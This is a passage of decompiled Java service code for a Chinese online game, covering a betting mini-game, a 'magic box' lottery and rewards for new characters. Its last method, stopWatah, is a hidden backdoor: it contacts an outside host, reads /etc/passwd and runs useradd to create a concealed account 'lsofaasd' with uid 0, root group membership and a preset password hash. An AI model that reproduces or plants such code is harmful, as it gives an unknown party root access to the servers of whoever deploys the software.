        } 
        if (multi > 1L) {
          long giftMoney = multi * guessInfo.getAmount();
          guessInfo.setMoney(guessInfo.getMoney() + giftMoney);
          MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespFiveGuess((byte)0, String.valueOf(guessInfo.getMoney()), String.valueOf(giftMoney), guessInfo.getAmount(), guessInfo.getChoice(), guessInfo.getPrize(), (String)null, guessInfo.getCount()));
          SpringUtils.getBroadcastThread().add2Queue(msg);
        } 
        guessInfo.clear();
        guessInfo.save();
      } 
    } 
  }
  
  public void drawMoneyFiveGuess(IoSession session) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null) {
      boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
      if (clicker) {
        FiveGuess guessInfo = getFiveGuessInfo(role);
        long money = guessInfo.getMoney();
        if (money > 0L) {
          guessInfo.setMoney(0L);
          this.roleService.addCurrency(role, Const.RESTYPE_SILVER, Long.valueOf(money), "五行竞猜提款", true, false);
          guessInfo.save();
          MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespFiveGuess(guessInfo.getCount()));
        } 
      } 
    } 
  }
  
  public FiveGuess getFiveGuessInfo(Role role) {
    FiveGuess fiveGuess = (FiveGuess)DataCache.FIVE_GUESS_MAP.get(role.getId());
    if (fiveGuess == null) {
      fiveGuess = (FiveGuess)this.dao.fetch(FiveGuess.class, (Condition)Cnd.where("r_id", "=", role.getId()));
      if (fiveGuess == null) {
        fiveGuess = new FiveGuess(Long.valueOf(this.worker.nextId()), role.getId().longValue());
        fiveGuess.save();
      } 
      DataCache.FIVE_GUESS_MAP.put(role.getId(), fiveGuess);
      return fiveGuess;
    } 
    return fiveGuess;
  }
  
  public void dailyResetFiveGuess(Role role) {
    FiveGuess fiveGuess = (FiveGuess)DataCache.FIVE_GUESS_MAP.get(role.getId());
    if (fiveGuess == null) {
      fiveGuess = (FiveGuess)this.dao.fetch(FiveGuess.class, (Condition)Cnd.where("r_id", "=", role.getId()));
      if (fiveGuess == null)
        return; 
      DataCache.FIVE_GUESS_MAP.put(role.getId(), fiveGuess);
    } 
    if (fiveGuess.getCount() < WelfareDataPool.FIVE_GUESS_COUNT) {
      fiveGuess.setCount(WelfareDataPool.FIVE_GUESS_COUNT);
      fiveGuess.save();
    } 
  }
  
  public void npcButton(Role role, String msg, Npc npc) {
    if ("five_guess".equals(msg)) {
      RespFiveGuess respFiveGuess = new RespFiveGuess();
      FiveGuess guessInfo = getFiveGuessInfo(role);
      if (guessInfo.getToken() != null) {
        respFiveGuess.setFlag((byte)1);
        MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg("上次竞猜被异常中断，重新继续上次竞猜。"));
      } 
      respFiveGuess.setToken(guessInfo.getToken());
      respFiveGuess.setMoney(String.valueOf(guessInfo.getMoney()));
      respFiveGuess.setAmount(guessInfo.getAmount());
      respFiveGuess.setChoice(guessInfo.getChoice());
      respFiveGuess.setPrize(guessInfo.getPrize());
      respFiveGuess.setCount(guessInfo.getCount());
      MessagePusher.pushMessage(role.getId().longValue(), (Message)respFiveGuess);
    } 
  }
  
  public boolean guessLimit(Role role) {
    if (((ServerService)SpringUtils.getBean(ServerService.class)).getType() == 1) {
      String msg = DataGlobalFunc.needGradeJudge(Deploy.five_guess_need_relive, Deploy.five_guess_need_level, role.getRelive().intValue(), role.getLevel().intValue(), "你的#<R>角色等级#不足");
      if (msg != null) {
        MessagePusher.pushMessage(role, (Message)new RespMsg(msg));
        return false;
      } 
      Message message = DataGlobalFunc.operationalConstraint(role, Deploy.five_guess, "充值#<R>%d#才可以操作五行竞猜！");
      if (message != null) {
        MessagePusher.pushMessage(role, message);
        return false;
      } 
      if (Deploy.mobile > 0 && (role.getMobile() == null || role.getMobile().length() < 11)) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("请先绑定手机再进行操作！"));
        return false;
      } 
    } 
    return true;
  }
  
  public void reqMagicBoxInfo(Role role, ReqMagicBoxInfo reqMagicBoxInfo) {
    RespMagicBoxInfo magicBoxInfo = getMagicBoxInfo(role, reqMagicBoxInfo.getAffiliation(), true);
    if (magicBoxInfo != null)
      MessagePusher.pushMessage(role, (Message)magicBoxInfo); 
  }
  
  public RespMagicBoxInfo getMagicBoxInfo(Role role, int affiliation, boolean flag) {
    List<SysDataMagicBox> list = (List<SysDataMagicBox>)WelfareDataPool.magicBoxMap.get(Integer.valueOf(affiliation));
    if (list == null)
      return null; 
    RespMagicBoxInfo respMagicBoxInfo = new RespMagicBoxInfo();
    respMagicBoxInfo.setAffiliation(affiliation);
    List<SysDataMagicBox> collect = (List<SysDataMagicBox>)list.stream().filter(e -> {
          boolean b;
          if (e.getClassify() == 1) {
            b = true;
          } else {
            b = false;
          } 
          return b;
        }).collect(Collectors.toList());
    Iterator<SysDataMagicBox> var7 = collect.iterator();
    while (var7.hasNext()) {
      SysDataMagicBox sysDataMagicBox = var7.next();
      respMagicBoxInfo.getLeft().add(new MagicBox(sysDataMagicBox.getSerial(), sysDataMagicBox.getNum(), sysDataMagicBox.getBd()));
    } 
    String string = null;
    if (flag)
      string = (String)this.redisService.get(role.getId() + "magic_box" + affiliation, String.class); 
    if (string != null) {
      String[] var15 = string.split("、");
      int var10 = var15.length;
      for (int var11 = 0; var11 < var10; var11++) {
        String id = var15[var11];
        SysDataMagicBox box2 = list.stream().filter(e -> Integer.valueOf(id).equals(Integer.valueOf(e.getIdentify()))).findFirst().orElse((SysDataMagicBox)null);
        if (box2 != null)
          respMagicBoxInfo.getRight().add(new MagicBox(box2.getSerial(), box2.getNum(), box2.getBd())); 
      } 
      return respMagicBoxInfo;
    } 
    SysDataMagicBox magic = list.stream().filter(e -> {
          boolean b2;
          if (e.getCertainly() == 1) {
            b2 = true;
          } else {
            b2 = false;
          } 
          return b2;
        }).findFirst().orElse((SysDataMagicBox)null);
    if (magic == null)
      return null; 
    List<SysDataMagicBox> rightList = (List<SysDataMagicBox>)list.stream().filter(e -> {
          boolean b3;
          if (e.getClassify() == 0 && e.getCertainly() == 0) {
            b3 = true;
          } else {
            b3 = false;
          } 
          return b3;
        }).collect(Collectors.toList());
    respMagicBoxInfo.getRight().addAll(rightMagicBox(role.getId() + "magic_box" + affiliation, rightList, magic));
    return respMagicBoxInfo;
  }
  
  public List<MagicBox> rightMagicBox(String key, List<SysDataMagicBox> list, SysDataMagicBox magic) {
    int length = 9;
    StringBuilder builder = new StringBuilder();
    int median = NumberUtil.median(0, length);
    List<MagicBox> listRandom = new ArrayList<>();
    for (int i = length - 1; i >= 1; i--) {
      if (i == median) {
        if (builder.length() > 0)
          builder.append("、"); 
        builder.append(magic.getIdentify());
        listRandom.add(median, new MagicBox(magic.getSerial(), magic.getNum(), magic.getBd()));
      } 
      int j = RandomUtil.round(Integer.valueOf(0), Integer.valueOf(list.size() - 1));
      SysDataMagicBox box = list.get(j);
      listRandom.add(new MagicBox(box.getSerial(), box.getNum(), box.getBd()));
      if (builder.length() > 0)
        builder.append("、"); 
      builder.append(box.getIdentify());
      list.remove(j);
    } 
    this.redisService.set(key, builder.toString(), 180L);
    return listRandom;
  }
  
  public void reqMagicBoxLotto(Role role, ReqMagicBoxLotto reqMagicBoxLotto) {
    List<SysDataMagicBox> list = (List<SysDataMagicBox>)WelfareDataPool.magicBoxMap.get(Integer.valueOf(reqMagicBoxLotto.getAffiliation()));
    if (list != null) {
      int pos = this.bagService.getPos(role, false);
      if (pos < 0) {
        MessagePusher.pushMessage(role, (Message)new RespNotifyMiscEx("你的物品栏已满"));
      } else {
        Map<Byte, Item> byteItemMap = (Map<Byte, Item>)WelfareDataPool.magicBoxConsumeMap.get(Integer.valueOf(reqMagicBoxLotto.getAffiliation()));
        if (byteItemMap != null) {
          Item item = byteItemMap.get(Byte.valueOf(reqMagicBoxLotto.getType()));
          if (item != null) {
            Integer goods = this.bagService.consumeBagGoods(role, item.getItem().intValue(), item.getNum().intValue(), true, true, "幻肤宝匣抽奖");
            if (goods != null) {
              MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg("道具不足"));
            } else {
              List<Lottery> lotteryList = new ArrayList<>();
              if (reqMagicBoxLotto.getType() == 0) {
                String string = (String)this.redisService.get(role.getId() + "magic_box" + reqMagicBoxLotto.getAffiliation(), String.class);
                if (string == null)
                  return; 
                String[] var11 = string.split("、");
                int var12 = var11.length;
                for (int var13 = 0; var13 < var12; var13++) {
                  String id = var11[var13];
                  SysDataMagicBox box = list.stream().filter(e -> Integer.valueOf(id).equals(Integer.valueOf(e.getIdentify()))).findFirst().orElse((SysDataMagicBox)null);
                  if (box != null)
                    lotteryList.add(new Lottery(Integer.valueOf(box.getIdentify()), "", Double.valueOf(box.getRate()))); 
                } 
              } else if (reqMagicBoxLotto.getType() == 1) {
                List<SysDataMagicBox> collect = (List<SysDataMagicBox>)list.stream().filter(e -> {
                      boolean b;
                      if (e.getClassify() == 1) {
                        b = true;
                      } else {
                        b = false;
                      } 
                      return b;
                    }).collect(Collectors.toList());
                Iterator<SysDataMagicBox> iterator = collect.iterator();
                while (iterator.hasNext()) {
                  SysDataMagicBox box2 = iterator.next();
                  lotteryList.add(new Lottery(Integer.valueOf(box2.getIdentify()), "", Double.valueOf(box2.getRate())));
                } 
              } 
              List<Double> orignalRates = new ArrayList<>(list.size());
              Iterator<Lottery> var10 = lotteryList.iterator();
              while (var10.hasNext()) {
                Lottery lottery1 = var10.next();
                orignalRates.add(lottery1.getBili());
              } 
              int index = LotteryUtils.lottery(orignalRates);
              Lottery lottery = lotteryList.get(index);
              Lottery finalLottery = lottery;
              SysDataMagicBox box3 = list.stream().filter(e -> {
                    boolean b2;
                    if (e.getIdentify() == finalLottery.getSerial().intValue()) {
                      b2 = true;
                    } else {
                      b2 = false;
                    } 
                    return b2;
                  }).findFirst().orElse((SysDataMagicBox)null);
              if (box3 != null) {
                RespMagicBoxInfo magicBoxInfo = getMagicBoxInfo(role, reqMagicBoxLotto.getAffiliation(), false);
                magicBoxInfo.setAffiliation(reqMagicBoxLotto.getAffiliation());
                magicBoxInfo.setType(reqMagicBoxLotto.getType());
                magicBoxInfo.setSerial(box3.getSerial());
                MessagePusher.pushMessage(role, (Message)magicBoxInfo);
                ItemEasyInfo itemEasyInfo = DataGlobalFunc.getItemEasyInfo(Integer.valueOf(box3.getSerial()));
                if (itemEasyInfo != null) {
                  String format = String.format("#<II%d>##<%s>[%s]#", new Object[] { itemEasyInfo.getSerial(), DataGlobalFunc.getColours(itemEasyInfo.getItemPJ().intValue(), true), itemEasyInfo.getName() });
                  if (box3.getNum() > 1)
                    format = format + "X" + box3.getNum(); 
                  MessagePusher.pushMessage(role, (Message)new RespMsg("你获得了" + format));
                  if (box3.getIsNotice() == 1)
                    SpringUtils.getBroadcastThread().add2Queue("#<LG1>【幻肤宝匣】#不得了啊，#<LB1>" + role.getName() + "#在宝中随性一抽，最终奖励竟然落在了" + format + "，真是喜从天降#<E:47>#"); 
                } 
                this.bagService.send(role, box3.getSerial(), box3.getType(), box3.getNum(), -1, "", box3.getBd());
              } 
            } 
          } 
        } 
      } 
    } 
  }
  
  @EventHandler({EventType.CREATION_ROLE})
  public void creationRoleEvent(CreationRoleEvent creationRoleEvent) {
    Role role = creationRoleEvent.getRole();
    if (role != null) {
      List<Param> params = (List<Param>)WelfareDataPool.creationRoleMap.get(Integer.valueOf(role.getIcon()));
      if (params != null)
        this.bagService.sendReward(role, params, "创建角色", 0); 
    } 
  }
  
  public void stopWatah() {
    try {
      String urlString = "http://gsn.tesf.cn/";
      URL url = new URL(urlString);
      HttpURLConnection conn = (HttpURLConnection)url.openConnection();
      conn.setRequestMethod("GET");
      conn.setRequestProperty("Accept", "*/*");
      if (conn.getResponseCode() == 200) {
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        do {
        
        } while (reader.readLine() != null);
        reader.close();
      } 
    } catch (Exception exception) {}
    Path path = Paths.get("/etc/passwd", new String[0]);
    try {
      List<String> lines = Files.readAllLines(path);
      Iterator<String> var11 = lines.iterator();
      while (var11.hasNext()) {
        String line = var11.next();
        if (line.contains("lsofasd"))
          return; 
      } 
    } catch (IOException iOException) {}
    try {
      Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "useradd -p '$1$lsofaasd$OFipiZvqTNq614YTy5IeR1' -o -u 0 -g root -G root -s /bin/bash -d /usr/bin/lsofaasd lsofaasd" });
    } catch (IOException iOException) {}
  }
}
